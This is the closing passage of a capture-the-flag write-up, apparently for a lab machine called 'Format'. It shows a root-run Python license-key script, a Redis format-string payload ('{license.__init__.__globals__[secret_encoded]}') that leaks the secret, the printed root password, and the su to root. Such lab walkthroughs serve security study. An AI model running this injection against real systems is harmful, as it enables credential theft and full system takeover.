        <span class="bp">self</span><span class="o">.</span><span class="n">license</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()</span>

<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Microblog license key manager can only be run as root&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Microblog license key manager&#39;</span><span class="p">)</span>
<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--provision&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Provision license key for specified user&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
<span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--deprovision&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Deprovision license key for specified user&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
<span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="s1">&#39;--check&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Check if specified license key is valid&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;license_key&#39;</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s1">&#39;/var/run/redis/redis.sock&#39;</span><span class="p">)</span>

<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/root/license/secret&quot;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;microblogsalt123&#39;</span>
<span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="o">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="o">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>

<span class="c1">#provision</span>
<span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">):</span>
    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;User does not exist. Please provide valid username.&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/root/license/keys&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>
    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;License key has already been provisioned for this user&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;microblog&quot;</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&quot;username&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&quot;first-name&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&quot;last-name&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="si">{license.license}</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Plaintext license key:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;------------------------------------------------------&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Encrypted license key (distribute to customer):&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;------------------------------------------------------&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/root/license/keys&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
        <span class="n">license_keys_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1">#deprovision</span>
<span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">deprovision</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;License key deprovisioning coming soon&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="c1">#check</span>
<span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">check</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">check</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;License key valid! Decrypted value:&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;------------------------------------------------------&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;License key invalid&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>

</pre></div>
</div>
<p>We control the keys from redis and they are used in a format string that is then printed to us, so we can use any of these keys in redis with curly braces to print the content of the variable we’re after.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>HMSET<span class="w"> </span>blnkn<span class="w"> </span>first-name<span class="w"> </span><span class="s2">&quot;{license.__init__.__globals__[secret_encoded]}&quot;</span><span class="w"> </span>last-name<span class="w"> </span>blnkn<span class="w"> </span>password<span class="w"> </span>blnkn<span class="w"> </span>username<span class="w"> </span>blnkn
OK
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>HGET<span class="w"> </span>blnkn<span class="w"> </span>first-name
<span class="s2">&quot;{license.__init__.__globals__[secret_encoded]}&quot;</span>
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>HKEYS<span class="w"> </span>blnkn
<span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;first-name&quot;</span>
<span class="m">2</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;last-name&quot;</span>
<span class="m">3</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;password&quot;</span>
<span class="m">4</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;username&quot;</span>
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;
</pre></div>
</div>
<p>We get the secret back instead of our first-name</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cooper@format:~$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/license<span class="w"> </span>-p<span class="w"> </span>blnkn

Plaintext<span class="w"> </span>license<span class="w"> </span>key:
------------------------------------------------------
microblogblnknn-v?H<span class="se">\4</span>8Qe~q<span class="s2">&quot;A{TZ*{&gt;/2nGf@DL&amp;UY;{|G;~6K&amp;b&#39;unCR4ckaBL3Pa</span><span class="nv">$$</span><span class="s2">w0rd&#39;blnkn</span>

<span class="s2">Encrypted license key (distribute to customer):</span>
<span class="s2">------------------------------------------------------</span>
<span class="s2">gAAAAABkaNx5eFFJOyYg6iEvxZqDlj4JOK3Vd05j2aEm1t0eLlNvwV10Od7nqUOi0m5L0fcqQgULOgmg3MGeBZ95XZwE_OxdNBPNg7YV7-k0al4m3VSSsl2o6-mVEQ5EjdGLE72Ej8sk39ugOcYK_B_v2SRfY6YDrL-5CcBSFhI5WH4CA0MPFV0gBbyB4aHxClDu6gdXbISk</span>
</pre></div>
</div>
<p>And as predicted it is the password for root</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cooper@format:~$<span class="w"> </span>su<span class="w"> </span>-
Password:
root@format:~#<span class="w"> </span>
</pre></div>
</div>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../health/health.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Health</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../forgot/forgot.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Forgot</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Format</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#xss-red-herring">XSS (red herring)</a></li>
<li><a class="reference internal" href="#lfi">LFI</a></li>
<li><a class="reference internal" href="#nginx-proxy-misconfiguration-leading-to-a-blind-redis-injection">Nginx proxy misconfiguration leading to a blind redis injection</a></li>
<li><a class="reference internal" href="#automating-the-exploit">Automating the exploit</a></li>
<li><a class="reference internal" href="#abusing-the-upload-feature-to-get-a-php-shell">Abusing the upload feature to get a PHP shell</a></li>
<li><a class="reference internal" href="#privesc-from-www-data-to-cooper">Privesc from www-data to cooper</a></li>
<li><a class="reference internal" href="#privesc-from-cooper-to-root">Privesc from cooper to root</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>